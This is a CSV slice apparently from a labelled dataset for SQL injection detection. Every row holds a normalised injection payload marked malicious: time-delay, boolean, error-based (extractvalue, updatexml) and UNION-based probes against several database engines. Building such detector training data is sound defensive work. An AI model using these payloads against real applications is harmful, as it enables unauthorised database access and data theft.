row_index,payload_norm,label,sqli_type_hint
1620,select pg_sleep ( 5 ) -- ojzt,1,
1621,begin dbms_lock.sleep ( 5 ),1,
1622,-9202' where 9799 = 9799 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1,
1623,select ( case when ( 9562 = 5996 ) then 1 else 9562* ( select 9562 from master..sysdatabases ) end ) --,1,
1624,"1"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""gxqq"" = ""gxqq",1,
1625,"1%' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
1626,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,
1627,1' ) where 2208 = 2208 rlike sleep ( 5 ) #,1,
1628,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'gkku' like 'gkku",1,
1629,"select * from generate_series ( 4592,4592,case when ( 4592 = 4592 ) then 1 else 0 end ) limit 1--",1,
1630,"iif ( 1157 = 4542,1,1/0 )",1,
1631,"-9039' ) union all select 8058,8058,8058,8058,8058--",1,
1632,1 and ( 3020 = 3020 ) *6703# syuj,1,
1633,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'gfpd' = 'gfpd",1,
1634,"1"" and elt ( 8464 = 5761,5761 ) and ""ydmt"" like ""ydmt",1,
1635,"-7272"" ) union all select 9163,9163,9163,9163,9163,9163,9163--",1,
1636,"1 ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 4510 = 4510",1,
1637,"1'|| ( select 'svgd' from dual where 5188 = 5188 union all select null,null,null,null,null#",1,
1638,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'zenl' like 'zenl",1,
1639,"1"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""mmsh"" = ""mmsh",1,
1640,"-5052 ) ) ) union all select 8351,8351,8351,8351#",1,
1641,"select * from generate_series ( 4465,4465,case when ( 4465 = 6232 ) then 1 else 0 end ) limit 1--",1,
1642,"1"" ) as gdcx where 2335 = 2335 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",1,
1643,1'+ ( select 'feof' where 1966 = 1966,1,
1644,"1"" rlike sleep ( 5 ) and ""veub"" = ""veub",1,
1645,"-3169"" order by 1#",1,
1646,"1 ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
1647,waitfor delay '0:0:5' and 'dfzn' = 'dfzn,1,
1648,"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""enfu"" = ""enfu",1,
1649,"-6597'+ ( select aewz where 4036 = 4036 union all select 4036,4036,4036,4036,4036,4036,4036--",1,
